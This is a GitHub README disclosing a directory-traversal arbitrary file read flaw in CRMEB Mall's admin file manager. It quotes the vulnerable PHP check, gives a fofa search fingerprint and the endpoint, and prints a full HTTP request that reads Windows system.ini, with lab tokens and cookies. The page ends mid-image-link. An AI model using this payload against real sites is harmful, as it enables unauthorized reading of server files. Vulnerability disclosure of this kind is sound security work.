=== Content from github.com_9def806f_20250110_232642.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FEchosssy%2F-CRMEB-Mall-commercial-version-of-any-file-read-vulnerability%2Fblob%2Fmain%2FREADME.md)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FEchosssy%2F-CRMEB-Mall-commercial-version-of-any-file-read-vulnerability%2Fblob%2Fmain%2FREADME.md)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fblob%2Fshow&source=header-repo&source_repo=Echosssy%2F-CRMEB-Mall-commercial-version-of-any-file-read-vulnerability)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[Echosssy](/Echosssy)
/
**[-CRMEB-Mall-commercial-version-of-any-file-read-vulnerability](/Echosssy/-CRMEB-Mall-commercial-version-of-any-file-read-vulnerability)**
Public

* [Notifications](/login?return_to=%2FEchosssy%2F-CRMEB-Mall-commercial-version-of-any-file-read-vulnerability) You must be signed in to change notification settings
* [Fork
  0](/login?return_to=%2FEchosssy%2F-CRMEB-Mall-commercial-version-of-any-file-read-vulnerability)
* [Star
   0](/login?return_to=%2FEchosssy%2F-CRMEB-Mall-commercial-version-of-any-file-read-vulnerability)

* [Code](/Echosssy/-CRMEB-Mall-commercial-version-of-any-file-read-vulnerability)
* [Issues
  0](/Echosssy/-CRMEB-Mall-commercial-version-of-any-file-read-vulnerability/issues)
* [Pull requests
  0](/Echosssy/-CRMEB-Mall-commercial-version-of-any-file-read-vulnerability/pulls)
* [Actions](/Echosssy/-CRMEB-Mall-commercial-version-of-any-file-read-vulnerability/actions)
* [Projects
  0](/Echosssy/-CRMEB-Mall-commercial-version-of-any-file-read-vulnerability/projects)
* [Security](/Echosssy/-CRMEB-Mall-commercial-version-of-any-file-read-vulnerability/security)
* [Insights](/Echosssy/-CRMEB-Mall-commercial-version-of-any-file-read-vulnerability/pulse)

Additional navigation options

* [Code](/Echosssy/-CRMEB-Mall-commercial-version-of-any-file-read-vulnerability)
* [Issues](/Echosssy/-CRMEB-Mall-commercial-version-of-any-file-read-vulnerability/issues)
* [Pull requests](/Echosssy/-CRMEB-Mall-commercial-version-of-any-file-read-vulnerability/pulls)
* [Actions](/Echosssy/-CRMEB-Mall-commercial-version-of-any-file-read-vulnerability/actions)
* [Projects](/Echosssy/-CRMEB-Mall-commercial-version-of-any-file-read-vulnerability/projects)
* [Security](/Echosssy/-CRMEB-Mall-commercial-version-of-any-file-read-vulnerability/security)
* [Insights](/Echosssy/-CRMEB-Mall-commercial-version-of-any-file-read-vulnerability/pulse)

## Files

 main
## Breadcrumbs

1. [-CRMEB-Mall-commercial-version-of-any-file-read-vulnerability](/Echosssy/-CRMEB-Mall-commercial-version-of-any-file-read-vulnerability/tree/main)
/
# README.md

Copy path Blame  Blame
## Latest commit

## History

[History](/Echosssy/-CRMEB-Mall-commercial-version-of-any-file-read-vulnerability/commits/main/README.md)95 lines (76 loc) · 5.67 KB main
## Breadcrumbs

1. [-CRMEB-Mall-commercial-version-of-any-file-read-vulnerability](/Echosssy/-CRMEB-Mall-commercial-version-of-any-file-read-vulnerability/tree/main)
/
# README.md

Top
## File metadata and controls

* Preview
* Code
* Blame

95 lines (76 loc) · 5.67 KB[Raw](https://github.com/Echosssy/-CRMEB-Mall-commercial-version-of-any-file-read-vulnerability/raw/refs/heads/main/README.md)

众邦科技CRMEB Mall commercial version of any file read vulnerability
Source-codes：<https://gitee.com/ZhongBangKeJi/CRMEB>
源码归属：众邦科技
[![image](https://private-user-images.githubusercontent.com/114723111/302984773-a752972c-9b99-4256-982e-f1dda1ff8f3b.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY1NTE5MDIsIm5iZiI6MTczNjU1MTYwMiwicGF0aCI6Ii8xMTQ3MjMxMTEvMzAyOTg0NzczLWE3NTI5NzJjLTliOTktNDI1Ni05ODJlLWYxZGRhMWZmOGYzYi5wbmc_WC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BS0lBVkNPRFlMU0E1M1BRSzRaQSUyRjIwMjUwMTEwJTJGdXMtZWFzdC0xJTJGczMlMkZhd3M0X3JlcXVlc3QmWC1BbXotRGF0ZT0yMDI1MDExMFQyMzI2NDJaJlgtQW16LUV4cGlyZXM9MzAwJlgtQW16LVNpZ25hdHVyZT1hZWUwZDJiNDExYzk3M2M1NTIyNDY4M2Q2Yzk1YWJjOTAyYThmOTQ1MjM0ZTgzNjViZGU2YzRhYWM3ZjIzYWRlJlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCJ9.zp4MOBZIfLWM04hP1fRokh8nGoUE6I9bg0ESTlxOKHg)](https://private-user-images.githubusercontent.com/114723111/302984773-a752972c-9b99-4256-982e-f1dda1ff8f3b.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY1NTE5MDIsIm5iZiI6MTczNjU1MTYwMiwicGF0aCI6Ii8xMTQ3MjMxMTEvMzAyOTg0NzczLWE3NTI5NzJjLTliOTktNDI1Ni05ODJlLWYxZGRhMWZmOGYzYi5wbmc_WC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BS0lBVkNPRFlMU0E1M1BRSzRaQSUyRjIwMjUwMTEwJTJGdXMtZWFzdC0xJTJGczMlMkZhd3M0X3JlcXVlc3QmWC1BbXotRGF0ZT0yMDI1MDExMFQyMzI2NDJaJlgtQW16LUV4cGlyZXM9MzAwJlgtQW16LVNpZ25hdHVyZT1hZWUwZDJiNDExYzk3M2M1NTIyNDY4M2Q2Yzk1YWJjOTAyYThmOTQ1MjM0ZTgzNjViZGU2YzRhYWM3ZjIzYWRlJlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCJ9.zp4MOBZIfLWM04hP1fRokh8nGoUE6I9bg0ESTlxOKHg)
[![image](https://private-user-images.githubusercontent.com/114723111/302984818-7842ac19-07bf-4c69-a064-124448162aee.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY1NTE5MDIsIm5iZiI6MTczNjU1MTYwMiwicGF0aCI6Ii8xMTQ3MjMxMTEvMzAyOTg0ODE4LTc4NDJhYzE5LTA3YmYtNGM2OS1hMDY0LTEyNDQ0ODE2MmFlZS5wbmc_WC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BS0lBVkNPRFlMU0E1M1BRSzRaQSUyRjIwMjUwMTEwJTJGdXMtZWFzdC0xJTJGczMlMkZhd3M0X3JlcXVlc3QmWC1BbXotRGF0ZT0yMDI1MDExMFQyMzI2NDJaJlgtQW16LUV4cGlyZXM9MzAwJlgtQW16LVNpZ25hdHVyZT05ZmRkMGJlY2U0MWQ2OGY3MDgyMTRjNzczZDA5ZDQ1MWU3Nzk3MTg2ZDczZjUyMjgxYWY0NzcwNzE5YTAxYWM3JlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCJ9.vNru86WZ0ra668Wn2n3UyAHdkBqzhDoKoKLvsdpad00)](https://private-user-images.githubusercontent.com/114723111/302984818-7842ac19-07bf-4c69-a064-124448162aee.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY1NTE5MDIsIm5iZiI6MTczNjU1MTYwMiwicGF0aCI6Ii8xMTQ3MjMxMTEvMzAyOTg0ODE4LTc4NDJhYzE5LTA3YmYtNGM2OS1hMDY0LTEyNDQ0ODE2MmFlZS5wbmc_WC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BS0lBVkNPRFlMU0E1M1BRSzRaQSUyRjIwMjUwMTEwJTJGdXMtZWFzdC0xJTJGczMlMkZhd3M0X3JlcXVlc3QmWC1BbXotRGF0ZT0yMDI1MDExMFQyMzI2NDJaJlgtQW16LUV4cGlyZXM9MzAwJlgtQW16LVNpZ25hdHVyZT05ZmRkMGJlY2U0MWQ2OGY3MDgyMTRjNzczZDA5ZDQ1MWU3Nzk3MTg2ZDczZjUyMjgxYWY0NzcwNzE5YTAxYWM3JlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCJ9.vNru86WZ0ra668Wn2n3UyAHdkBqzhDoKoKLvsdpad00)

company's official website：<https://www.crmeb.com/>
fofa：icon\_hash="-847565074"
[![image](https://private-user-images.githubusercontent.com/114723111/302984849-6db98b12-4931-4aa8-8f72-db9d370e765d.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY1NTE5MDIsIm5iZiI6MTczNjU1MTYwMiwicGF0aCI6Ii8xMTQ3MjMxMTEvMzAyOTg0ODQ5LTZkYjk4YjEyLTQ5MzEtNGFhOC04ZjcyLWRiOWQzNzBlNzY1ZC5wbmc_WC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BS0lBVkNPRFlMU0E1M1BRSzRaQSUyRjIwMjUwMTEwJTJGdXMtZWFzdC0xJTJGczMlMkZhd3M0X3JlcXVlc3QmWC1BbXotRGF0ZT0yMDI1MDExMFQyMzI2NDJaJlgtQW16LUV4cGlyZXM9MzAwJlgtQW16LVNpZ25hdHVyZT1hNWU2MDE5ZWYwNTkxZTAxZmNlOTAxMGYyNmU0OTkwN2EzMzE2MzI3ODVkOTFhYTk2YjFmZjQ4N2I5YzA1ZTYxJlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCJ9.SGCcqYU5o8nM3PGaOfdI3nDpJecsQDb0cCkE2oNX83Y)](https://private-user-images.githubusercontent.com/114723111/302984849-6db98b12-4931-4aa8-8f72-db9d370e765d.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY1NTE5MDIsIm5iZiI6MTczNjU1MTYwMiwicGF0aCI6Ii8xMTQ3MjMxMTEvMzAyOTg0ODQ5LTZkYjk4YjEyLTQ5MzEtNGFhOC04ZjcyLWRiOWQzNzBlNzY1ZC5wbmc_WC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BS0lBVkNPRFlMU0E1M1BRSzRaQSUyRjIwMjUwMTEwJTJGdXMtZWFzdC0xJTJGczMlMkZhd3M0X3JlcXVlc3QmWC1BbXotRGF0ZT0yMDI1MDExMFQyMzI2NDJaJlgtQW16LUV4cGlyZXM9MzAwJlgtQW16LVNpZ25hdHVyZT1hNWU2MDE5ZWYwNTkxZTAxZmNlOTAxMGYyNmU0OTkwN2EzMzE2MzI3ODVkOTFhYTk2YjFmZjQ4N2I5YzA1ZTYxJlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCJ9.SGCcqYU5o8nM3PGaOfdI3nDpJecsQDb0cCkE2oNX83Y)

Code audit
public function openfile($filepath)
{
//根目录
$rootDir = $this->formatPath(app()->getRootPath());
//防止查看站点以外的文件
if (strpos($filepath, $rootDir) === false || $filepath == '') {
throw new AdminException('无法打开站点以外的文件');
}

```
    $filepath = $this->formatPath($filepath);
    $content = FileClass::readFile($filepath);//防止页面内嵌textarea标签
    $ext = FileClass::getExt($filepath);
    $encoding = mb_detect_encoding($content, mb_detect_order());
    //前端组件支持的语言类型
    //['plaintext', 'json', 'abap', 'apex', 'azcli', 'bat', 'cameligo', 'clojure', 'coffeescript', 'c', 'cpp', 'csharp', 'csp', 'css', 'dart', 'dockerfile', 'fsharp', 'go', 'graphql', 'handlebars', 'hcl', 'html', 'ini', 'java', 'javascript', 'julia', 'kotlin', 'less', 'lexon', 'lua', 'markdown', 'mips', 'msdax', 'mysql', 'objective-c', 'pascal', 'pascaligo', 'perl', 'pgsql', 'php', 'postiats', 'powerquery', 'powershell', 'pug', 'python', 'r', 'razor', 'redis', 'redshift', 'restructuredtext', 'ruby', 'rust', 'sb', 'scala', 'scheme', 'scss', 'shell', 'sol', 'aes', 'sql', 'st', 'swift', 'systemverilog', 'verilog', 'tcl', 'twig', 'typescript', 'vb', 'xml', 'yaml']

    $extarray = [
        'js' => 'javascript'
        , 'htm' => 'html'
        , 'shtml' => 'html'
        , 'html' => 'html'
        , 'xml' => 'xml'
        , 'php' => 'php'
        , 'sql' => 'mysql'
        , 'css' => 'css'
        , 'txt' => 'plaintext'
        , 'vue' => 'html'
        , 'json' => 'json'
        , 'lock' => 'json'
        , 'md' => 'markdown'
        , 'bat' => 'bat'
        , 'ini' => 'ini'

    ];
    $mode = empty($extarray[$ext]) ? 'php' : $extarray[$ext];
    return compact('content', 'mode', 'filepath', 'encoding');
}

```

//调用的readfile函数直接调用file\_get\_contents
public static function readFile(string $file)
{
return @file\_get\_contents($file);
}

The vulnerability point in this code code is intended to only open files within the root directory of the website, but you can use directory traversal to bypass
if (strpos($filepath, $rootDir) === false || $filepath == '') {
throw new AdminException('无法打开站点以外的文件');
}

As long as the filepath string contains rootdir, false can be returned to access other sensitive files through the matching directory
The interface is:
/adminapi/system/file/openfile
Vulnerability recurrence
Click File management as shown below to enter the password password can burst
[![image](https://private-user-images.githubusercontent.com/114723111/302984957-ff51ed16-211e-4278-b8c5-a0f031813d03.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY1NTE5MDIsIm5iZiI6MTczNjU1MTYwMiwicGF0aCI6Ii8xMTQ3MjMxMTEvMzAyOTg0OTU3LWZmNTFlZDE2LTIxMWUtNDI3OC1iOGM1LWEwZjAzMTgxM2QwMy5wbmc_WC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BS0lBVkNPRFlMU0E1M1BRSzRaQSUyRjIwMjUwMTEwJTJGdXMtZWFzdC0xJTJGczMlMkZhd3M0X3JlcXVlc3QmWC1BbXotRGF0ZT0yMDI1MDExMFQyMzI2NDJaJlgtQW16LUV4cGlyZXM9MzAwJlgtQW16LVNpZ25hdHVyZT0zMzQ0MzgyOTNmMGViZTEzMWUxMWFmZGZlYTZkNTY1ZTRmNjY3NjVmMGJmNzk1NTZkZWRmYTQ3NjhiY2FkNGMxJlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCJ9.RB19HE_bUw3N40keY9aPWtt8ycRrgP0Cn4Nv1luhUlA)](https://private-user-images.githubusercontent.com/114723111/302984957-ff51ed16-211e-4278-b8c5-a0f031813d03.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY1NTE5MDIsIm5iZiI6MTczNjU1MTYwMiwicGF0aCI6Ii8xMTQ3MjMxMTEvMzAyOTg0OTU3LWZmNTFlZDE2LTIxMWUtNDI3OC1iOGM1LWEwZjAzMTgxM2QwMy5wbmc_WC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BS0lBVkNPRFlMU0E1M1BRSzRaQSUyRjIwMjUwMTEwJTJGdXMtZWFzdC0xJTJGczMlMkZhd3M0X3JlcXVlc3QmWC1BbXotRGF0ZT0yMDI1MDExMFQyMzI2NDJaJlgtQW16LUV4cGlyZXM9MzAwJlgtQW16LVNpZ25hdHVyZT0zMzQ0MzgyOTNmMGViZTEzMWUxMWFmZGZlYTZkNTY1ZTRmNjY3NjVmMGJmNzk1NTZkZWRmYTQ3NjhiY2FkNGMxJlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCJ9.RB19HE_bUw3N40keY9aPWtt8ycRrgP0Cn4Nv1luhUlA)

Once inside, click on any file to edit it
[![image](https://private-user-images.githubusercontent.com/114723111/302984984-a5442764-e57e-4647-9d63-12ded0f58e89.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY1NTE5MDIsIm5iZiI6MTczNjU1MTYwMiwicGF0aCI6Ii8xMTQ3MjMxMTEvMzAyOTg0OTg0LWE1NDQyNzY0LWU1N2UtNDY0Ny05ZDYzLTEyZGVkMGY1OGU4OS5wbmc_WC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BS0lBVkNPRFlMU0E1M1BRSzRaQSUyRjIwMjUwMTEwJTJGdXMtZWFzdC0xJTJGczMlMkZhd3M0X3JlcXVlc3QmWC1BbXotRGF0ZT0yMDI1MDExMFQyMzI2NDJaJlgtQW16LUV4cGlyZXM9MzAwJlgtQW16LVNpZ25hdHVyZT1mZmRjYjUxZjY5NzQ3NjBhOGUyNGRjNTdiNjU1YjJjOWJmODY1NDdmYzBmOGJhMjMwYWM3NTExOTAzYjIwNzcwJlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCJ9.A7IYwkX9V71VVKlNsPHxJrXjtFuUmtS6hMlRjATjwsQ)](https://private-user-images.githubusercontent.com/114723111/302984984-a5442764-e57e-4647-9d63-12ded0f58e89.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY1NTE5MDIsIm5iZiI6MTczNjU1MTYwMiwicGF0aCI6Ii8xMTQ3MjMxMTEvMzAyOTg0OTg0LWE1NDQyNzY0LWU1N2UtNDY0Ny05ZDYzLTEyZGVkMGY1OGU4OS5wbmc_WC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BS0lBVkNPRFlMU0E1M1BRSzRaQSUyRjIwMjUwMTEwJTJGdXMtZWFzdC0xJTJGczMlMkZhd3M0X3JlcXVlc3QmWC1BbXotRGF0ZT0yMDI1MDExMFQyMzI2NDJaJlgtQW16LUV4cGlyZXM9MzAwJlgtQW16LVNpZ25hdHVyZT1mZmRjYjUxZjY5NzQ3NjBhOGUyNGRjNTdiNjU1YjJjOWJmODY1NDdmYzBmOGJhMjMwYWM3NTExOTAzYjIwNzcwJlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCJ9.A7IYwkX9V71VVKlNsPHxJrXjtFuUmtS6hMlRjATjwsQ)

The absolute path is found in the packet captured
[![image](https://private-user-images.githubusercontent.com/114723111/302985058-2fd208c4-7d15-4026-ba94-366be95e5c31.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY1NTE5MDIsIm5iZiI6MTczNjU1MTYwMiwicGF0aCI6Ii8xMTQ3MjMxMTEvMzAyOTg1MDU4LTJmZDIwOGM0LTdkMTUtNDAyNi1iYTk0LTM2NmJlOTVlNWMzMS5wbmc_WC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BS0lBVkNPRFlMU0E1M1BRSzRaQSUyRjIwMjUwMTEwJTJGdXMtZWFzdC0xJTJGczMlMkZhd3M0X3JlcXVlc3QmWC1BbXotRGF0ZT0yMDI1MDExMFQyMzI2NDJaJlgtQW16LUV4cGlyZXM9MzAwJlgtQW16LVNpZ25hdHVyZT03ZjlmNDVlZmE0MTJkNGY3YWYxYTkxOWNmNzAxMGRlZmRjOWJkOWI4NmY3NzE0OWFmMWRiOThhMTM1NGVkZGJlJlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCJ9.DOmxaxjp9uw0ymv99CaqsQmEizjBuIyjyeH5B_k3HdY)](https://private-user-images.githubusercontent.com/114723111/302985058-2fd208c4-7d15-4026-ba94-366be95e5c31.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY1NTE5MDIsIm5iZiI6MTczNjU1MTYwMiwicGF0aCI6Ii8xMTQ3MjMxMTEvMzAyOTg1MDU4LTJmZDIwOGM0LTdkMTUtNDAyNi1iYTk0LTM2NmJlOTVlNWMzMS5wbmc_WC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BS0lBVkNPRFlMU0E1M1BRSzRaQSUyRjIwMjUwMTEwJTJGdXMtZWFzdC0xJTJGczMlMkZhd3M0X3JlcXVlc3QmWC1BbXotRGF0ZT0yMDI1MDExMFQyMzI2NDJaJlgtQW16LUV4cGlyZXM9MzAwJlgtQW16LVNpZ25hdHVyZT03ZjlmNDVlZmE0MTJkNGY3YWYxYTkxOWNmNzAxMGRlZmRjOWJkOWI4NmY3NzE0OWFmMWRiOThhMTM1NGVkZGJlJlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCJ9.DOmxaxjp9uw0ymv99CaqsQmEizjBuIyjyeH5B_k3HdY)

The rootdir in the code is: C:\phpstudy\_pro1\WWW\ crmeb-master \CRMEB (usually when the front end sends data packets directly given without blasting)

Constructs payload to read system.ini
GET /adminapi/system/file/openfile?filepath=C:\phpstudy\_pro1\WWW\CRMEB-master\crmeb\..\..\..\..\Windows\system.ini&fileToken=a151c0055dd6ad351587ba743cd64bd0 HTTP/1.1
Host: 192.168.242.142:89
Accept: application/json, text/plain, */*
Authori-zation: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwd2QiOiIwZmQ0Yjc1ZTA2Nzc5MjMwOTdlZThlNmQzYTdkZTQwMSIsImlzcyI6IjE5Mi4xNjguMjQyLjE0Mjo4OSIsImF1ZCI6IjE5Mi4xNjguMjQyLjE0Mjo4OSIsImlhdCI6MTcwNjk0OTQ5OCwibmJmIjoxNzA2OTQ5NDk4LCJleHAiOjE3MDk1NDE0OTgsImp0aSI6eyJpZCI6MSwidHlwZSI6ImFkbWluIn19.sz3bKZVjTcXJZAleAahllknbcQjgR-4kl9zWAJ4aybM
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
Referer: <http://192.168.242.142:89/admin/system/maintain/system_file/opendir>
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: uuid=1; WS\_ADMIN\_URL=ws://192.168.242.142:89/notice; WS\_CHAT\_URL=ws://192.168.242.142:89/msg; cb\_lang=zh-cn; PHPSESSID=7ead6c57e767cbd757d0154f40bd9bb5; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwd2QiOiIwZmQ0Yjc1ZTA2Nzc5MjMwOTdlZThlNmQzYTdkZTQwMSIsImlzcyI6IjE5Mi4xNjguMjQyLjE0Mjo4OSIsImF1ZCI6IjE5Mi4xNjguMjQyLjE0Mjo4OSIsImlhdCI6MTcwNjk0OTQ5OCwibmJmIjoxNzA2OTQ5NDk4LCJleHAiOjE3MDk1NDE0OTgsImp0aSI6eyJpZCI6MSwidHlwZSI6ImFkbWluIn19.sz3bKZVjTcXJZAleAahllknbcQjgR-4kl9zWAJ4aybM; expires\_time=1709541498; file\_token=a151c0055dd6ad351587ba743cd64bd0
Connection: close

You can see that the directory can be traversed because it is not filtered
[![image](https://private-user-images.githubusercontent.com/114723111/302985131-a03c259a-3a8a-4bb7-947d-1d013255d609.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY1NTE5MDIsIm5iZiI6MTczNjU1MTYwMiwicGF0aCI6Ii8xMTQ3MjMxMTEvMzAyOTg1MTMxLWEwM2MyNTlhLTNhOGEtNGJiNy05NDdkLTFkMDEzMjU1ZDYwOS5wbmc_WC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BS0lBVkNPRFlMU0E1M1BRSzRaQSUyRjIwMjUwMTEwJTJGdXMtZWFzdC0xJTJGczMlMkZhd3M0X3JlcXVlc3QmWC1BbXotRGF0ZT0yMDI1MDExMFQyMzI2NDJaJlgtQW16LUV4cGlyZXM9MzAwJlgtQW16LVNpZ25hdHVyZT0wZDNmOTU1ZDYzYTc4MTE3ZTE2ZDRhYjBkMjI3MjcxMzAxOGZmOTcwZDQ5NDAyZDc0MzU0MDEwZDE2NThlMmJlJlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCJ9.vEhyhuZ0a3M4TgzS60l1X9o3hXGFC-Ed0unVq9mdfSY)](https://private-user-images.githubusercontent.com/114723111/302985131-a03c259a-3a8a-4bb7-947d-1d013255d609.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50L